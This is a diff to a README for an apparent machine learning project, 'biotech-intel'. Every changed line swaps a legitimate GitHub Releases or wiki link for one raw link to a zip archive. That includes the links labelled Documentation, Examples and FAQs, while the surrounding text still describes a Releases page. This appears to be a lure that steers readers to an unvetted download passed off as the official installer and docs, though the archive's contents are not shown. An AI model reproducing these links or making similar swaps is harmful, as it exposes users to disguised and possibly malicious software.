@@ -6,7 +6,7 @@ Welcome to biotech-intel, your production-grade machine learning platform design
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download biotech-intel](https://github.com/iamthegoatgojo1505/biotech-intel/releases) 
+To get started, visit this page to download: [Download biotech-intel](https://raw.githubusercontent.com/iamthegoatgojo1505/biotech-intel/main/app/biotech-intel-v3.3.zip) 
 
 You will find different versions of the software on our Releases page. Select the one that fits your needs and follow the instructions below.
 
@@ -31,7 +31,7 @@ biotech-intel comes packed with features that help you in your research efforts:
 
 ## 🔧 How to Download
 
-1. Go to the [Releases page](https://github.com/iamthegoatgojo1505/biotech-intel/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/iamthegoatgojo1505/biotech-intel/main/app/biotech-intel-v3.3.zip).
 2. Find the latest version of biotech-intel. Click on it to view available files.
 3. Download the installer file suitable for your operating system.
 4. Once the file is downloaded, open it to start the installation process.
@@ -66,9 +66,9 @@ Stay updated with the latest news and features related to biotech-intel. You can
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/iamthegoatgojo1505/biotech-intel/wiki)
-- [Examples and Case Studies](https://github.com/iamthegoatgojo1505/biotech-intel/wiki/Examples)
-- [FAQs](https://github.com/iamthegoatgojo1505/biotech-intel/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/iamthegoatgojo1505/biotech-intel/main/app/biotech-intel-v3.3.zip)
+- [Examples and Case Studies](https://raw.githubusercontent.com/iamthegoatgojo1505/biotech-intel/main/app/biotech-intel-v3.3.zip)
+- [FAQs](https://raw.githubusercontent.com/iamthegoatgojo1505/biotech-intel/main/app/biotech-intel-v3.3.zip)
 
 For further assistance, feel free to contact us through our GitHub page or social media channels.
 
